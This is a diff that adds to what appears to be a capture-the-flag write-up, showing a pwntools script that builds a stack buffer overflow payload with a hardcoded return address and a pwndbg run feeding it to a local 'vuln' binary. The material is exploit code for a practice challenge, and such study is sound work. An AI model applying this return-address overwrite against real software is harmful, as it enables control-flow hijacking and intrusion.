@@ -452,3 +452,21 @@ LEGEND: STACK | HEAP | CODE | DATA | RWX | RODATA
 *ESP  0xffffd5f0 ◂— 0xffffff0a
 *EIP  0x43434343 ('CCCC')
 ```
+
+```
+from pwn import p32
+import sys
+payload = b'A'*64 + b'TEST' + b'B'*16 + p32(0x8049336)
+sys.stdout.buffer.write(b"100\n" + payload)
+```
+
+```
+pwndbg> run < payload
+Starting program: /home/connor/Desktop/vuln < payload
+[Thread debugging using libthread_db enabled]                                                              
+Using host libthread_db library "/usr/lib/libthread_db.so.1".
+How Many Bytes will You Write Into the Buffer?
+> Input> Ok... Now Where's the Flag?
+Please create 'flag.txt' in this directory with your own debugging flag.
+[Inferior 1 (process 107530) exited normally]
+```
